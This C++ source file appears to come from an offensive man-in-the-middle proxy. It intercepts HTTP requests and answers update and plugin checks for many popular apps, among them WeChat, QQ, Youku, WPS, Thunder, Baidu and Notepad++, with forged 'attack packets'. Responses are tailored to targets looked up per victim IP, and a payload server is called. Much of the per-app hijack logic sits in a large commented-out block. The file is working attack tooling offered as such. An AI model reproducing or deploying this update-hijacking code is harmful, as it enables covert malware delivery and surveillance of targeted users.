#include "HttpAttack.h"
#include "../Utils/Tools.h"
#include "Toutiao.h"
#include "WeixinAndroid.h"
#include "PayloadServer.h"
#include "../HttpUtils.h"
#include "WeixinPC.h"
#include "../Public.h"
#include "QQAndroid.h"
#include "QQVideoSSL.h"
#include "InformerInterface.h"
#include "momo.h"
#include "QQMusicAndroid.h"
#include "ShuqiPlugin.h"
#include "MiaoPaiUpdate.h"
#include "IqiyiPlugin.h"
#include "JingdongPlugin.h"
#include "QQ.h"
#include "Youku.h"
#include "QQTencentNews.h"
#include "AttackSplitPacket.h"
#include <unordered_map>
#include "NotepadPP.h"
#include "SSLRetransfer.h"
#include "KugouPlugin.h"
#include "DouyuPlugin.h"
#include "letvPlugin.h"
#include "changbaPlugin.h"
#include "wgs2gcjPlugin.h"
#include "AmapHotfix.h"
#include "baofeng.h"
#include "AliProtect.h"
#include "WpsPlugin.h"
#include "ThunderUpdate.h"
#include "Duba.h"
#include "QQManager.h"
#include "BrowserDownload.h"
#include "sogouExplorer.h"
#include "BaiduPromotion.h"
#include "cboxPlugin.h"
#include "zhwnl.h"
#include "lbspos.h"
#include "MeituanPatch.h"
#include "NetEaseNewsUpdate.h"
#include "QQPim.h"
#include "Plugin2345.h"
#include "QQmtt.h"
#include "BaiduLocation.h"
#include "SunflowerUpdate.h"
#include "baiduNetDisk.h"
#include "Browser2345Android.h"
#include "qitu.h"
#include "peanutShell.h"
#include "../Helper.h"


int HttpAttack::httpAttackPacket(char* buf, int size, const char* url, const char* host, const char* httphdr,const char* httpdata, LPHTTPPROXYPARAM hpp) 
{
	int ret = 0;
	int retlen = 0;


	for (int i = 0; i < gUpdateData.size(); i++) {
		if (strstr(url,gUpdateData[i].url.c_str()) && strstr(host,gUpdateData[i].host.c_str())) {
			ret = sendAttackPacket(gUpdateData[i].response, gUpdateData[i].respSize, hpp);
			return ret;
		}
	}

	ret = SSLPublic::isAttackTargetHost(hpp->host);
	if (ret) {
		ret = PayloadServer::PluginServerProc(hpp, buf, size);
		return ret;
	}

	/*
	if (lphttp->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(lphttp->host, "127.0.0.1") ||
		(lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIP && gAttackMode != 3))
	{
		return TRUE;
	}

	if (lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIP)
	{
		if (gAttackMode == 3)
		{

		}
		else {
			return TRUE;
		}
	}
	else {
		if (Public::isPrivateIPAddress(lphttp->saToClient.sin_addr.S_un.S_addr))
		{
			return TRUE;
		}
	}

	if (strstr(lphttp->host, gstrServerIP.c_str()) || strstr(lphttp->host, gstrLocalIP.c_str()) ||
		strstr(lphttp->host, MYOWNSITE_ATTACK_DOMAINNAME))
	{
		if (strstr(url, ".well-known/pki-validation/fileauth.txt"))
		{
			lstrcpyA((char*)recvBuffer, "/fileauth.txt HTTP/1.1\r\nHost: helloqq.com\r\n\r\n");
			ret = PayloadServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
		}
		else if (QQVideoSSL::isTencentPcUpgrade(url, lphttp->host))
		{
			string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
			lstrcpyA(lphttp->username, username.c_str());
			ret = QQVideoSSL::replyTencentPcUpgrade(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		}
		else if (strstr((char*)url, "/fusion/3.0/plugin?"))
		{
			string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
			lstrcpyA(lphttp->username, username.c_str());
			int retlen = IqiyiPlugin::replyIqiyiPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
			if (retlen > 0)
			{
				ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
			}
		}
		else {
			ret = PayloadServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
		}
		return TRUE;
	}
	else if (LeTVPlugin::isletvPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = LeTVPlugin::replyletvPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (DuBa::isDuba(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = DuBa::replyDuba(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (TouTiao::isToutiaoUpdateConfig(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = TouTiao::makeToutiaoUpdateConfig(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQMusicAndroid::isQQMusicUpdatePacket(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQMusicAndroid::makeQQMusicUpdateResp((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (MiaoPaiUpdate::isMiaoPai(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = MiaoPaiUpdate::makeRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (QQBrowserPlugin::isQQBrowserPlugin(url, szdm, httphdr, httpdata))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQBrowserPlugin::sendQQBrowserPlugin((char*)recvBuffer, NETWORK_BUFFER_SIZE, username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (IqiyiPlugin::isIqiyi(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = IqiyiPlugin::replyIqiyiPlugin((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (KugouPlugin::isKugouPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = KugouPlugin::replyKugouPlugin((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (DouyuPlugin::isDouyu(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = DouyuPlugin::makeDouyuPluginReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (JingDongPlugin::isJingDong(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = JingDongPlugin::replyJingDongPlugin((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (ShuqiPlugin::isShuqiHead(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ShuqiPlugin::makeShuqiHeadReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (ShuqiPlugin::isShuqiRequest(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ShuqiPlugin::makeShuqiRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		//retlen = ShuqiPlugin::makeRedirection((char*)recvBuffer, iCounter,NETWORK_BUFFER_SIZE, lphttp);

		//ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (WeixinAndroid::isWxAndroidUpdateConfig(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = WeixinAndroid::makeWxAndroidUpdateConfig((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	//old ver pc weixin is http
	else if (QQAndroid::isAndroidQQApkUpdate(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::makeAndroidQQApkUpdateJs(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQVideoSSL::isQQVideo(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQVideoSSL::makeReponse(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (WeixinAndroid::isWxAndroidRequestApk(url, szdm) || WeixinAndroid::isWxAndroidRequestWebApk(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = WeixinAndroid::sendWxAndroidUpdateApk(url, szdm, httphdr, lphttp);

		return TRUE;
	}
	else if (Youku::isYoukuApk(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = Youku::replyYoukuApk(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp, httpdata);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQTencentNews::isQQNews(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQTencentNews::replyQQNews(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (NotepadPP::isNotepadExe(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = NotepadPP::replyNotepadExe(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQAndroid::isQQNowPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyQQNow(recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQAndroid::isQQPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyUpdate(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQAndroid::isQQNowMgrPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyQQNowMgrPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (QQAndroid::isQQSecLibs(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyQQSecLibsPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (QQPim::isQQPim(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQPim::replyQQPim(recvBuffer, lphttp);

		return TRUE;
	}
	else if (ChangBaPlugin::isChangba(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ChangBaPlugin::replyChangbaPlugin(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (Wgs2gcjPlugin::isWgs2gcj(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = Wgs2gcjPlugin::replyWgs2gcjPlugin(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (AmapHotfix::isAmapHotfix(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = AmapHotfix::replyAmapHotfixPlugin(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (BaofengPllugin::isBaofengUpdate(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = BaofengPllugin::replyBaofengPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (AlibabaProtect::isAliProtect(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = AlibabaProtect::replyAliProtect(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (ThunderUpdate::isThunder(url, szdm, httphdr))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ThunderUpdate::replyThunder(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (WPSPlugin::isWpsPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = WPSPlugin::replyWpsPcUpdate(recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (QQManager::isQQManager(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQManager::replayQQManager(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (SogouExplorer::isSogouExplorer(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = SogouExplorer::replySogouExplorer(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
			//return 0;
		}

		return TRUE;
	}
	else if (BaiduPromotion::isBaiduAd(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = BaiduPromotion::replyBaiduAd(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (BrowserDownload::isBrowserDownload(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = BrowserDownload::replyBrowserDownload(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (strstr(szdm, "360.cn") || strstr(szdm, "360.com"))
	{
		return TRUE;
	}
	else if (ZHWNL::isZhwnl(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ZHWNL::replyZhwnl(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (CboxPlugin::isCboxUpdate(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = CboxPlugin::makeReponse(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (LBSPos::isLBSPos(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = LBSPos::replyLBSPos(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (Browser2345Android::isBrowser2345Android(url, szdm, httpdata))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = Browser2345Android::replyBrowser2345Android(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (PeanutShell::isPeanutShell(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = PeanutShell::replyPeanutShell(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (QituAndroid::isQituAndroid(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = QituAndroid::replyQituAndroid(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	// 	else if (Momo::isMomoDns(url,szdm))
	// 	{
	// 		return FALSE;
	// 
	// 		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr,szdm);
	// 
	// 		lstrcpyA(lphttp->username, username.c_str());
	// 
	// 		return Momo::makeMomoDns(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
	// 	}
	else if (MeiTuanPatch::isMeiTuan(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = MeiTuanPatch::replyMeiTuan(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (NetEaseNewsUpdate::isNeteaseNews(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = NetEaseNewsUpdate::replyNetEaseNews(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (Plugin2345::isPlugin2345(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = Plugin2345::replyPlugin2345(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (QQmtt::isQQmttPlugin(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = QQmtt::replyQQmttPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (BaiduLocation::isBaiduLoc(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = BaiduLocation::replyBaiduLoc(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (SunflowerUpdate::isSunflower(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = SunflowerUpdate::replySunflower(recvBuffer, iCounter, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (BaiduNetDisk::isBaiduUpdateJson(url, szdm))
	{
		string username = InformerInterface::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = BaiduNetDisk::replyBaiduJson(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	*/
	return FALSE;
}


int HttpAttack::sendAttackPacket(const char* buf, int len,LPHTTPPROXYPARAM hpp) {
	int iRet = 0;

	if (len <= 0)
	{
		log("[%s %d]http attack data length:%u error\r\n", __FUNCTION__, __LINE__, len);
		return FALSE;
	}

	int sendlen = send(hpp->sockToClient, (char*)buf, len, 0);
	if (sendlen != len)
	{
		colorlog(FOREGROUND_GREEN,"[%s %d]HTTP attack error:%d,host:%s\n",__FUNCTION__,__LINE__, GetLastError(), hpp->host);
		return 0;
	}
	else {
		colorlog(FOREGROUND_GREEN,"[%s %d]HTTP attack ok,host:%s,packet:%s\n", __FUNCTION__, __LINE__, hpp->host, buf);
		return TRUE;
	}

	return TRUE;
}


//return value: none zero,shutdown connection;zero,continue connection
int HttpAttack::httpAttackProc( char* buf, int& size, LPHTTPPROXYPARAM hpp) {

	extern int gAttackToggle;
	if (gAttackToggle == 0) {
		return 0;
	}
	int ret = 0;

	char* httpdata = 0;
	string httphdr = "";
	string url = "";
	string host = "";
	int port = 0;

	ret = HttpUtils::parseHttpHdr(buf, size, httphdr, &httpdata, url, host, port);
	if (ret < 0)
	{
		if (hpp->host[0] == 0)
		{
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	else if (ret == 0)
	{
		ret = AttackSplitPacket::splitPacket(buf, size, hpp, httphdr, &httpdata, url, host, port);
		if (ret <= 0)
		{
			log("%s %d error:%d\r\n",__FUNCTION__,__LINE__,GetLastError());
			return TRUE;
		}
		else {
			lstrcpyA(hpp->host, host.c_str());
		}
	}
	else
	{
		lstrcpyA(hpp->host, host.c_str());
	}

	if (*hpp->host == 0)
	{
		return TRUE;
	}

	ret = HttpAttack::httpAttackPacket((char*)buf, size, url.c_str(), host.c_str(), httphdr.c_str(),httpdata, hpp);
	if (ret)
	{
		return TRUE;
	}

	return FALSE;
}

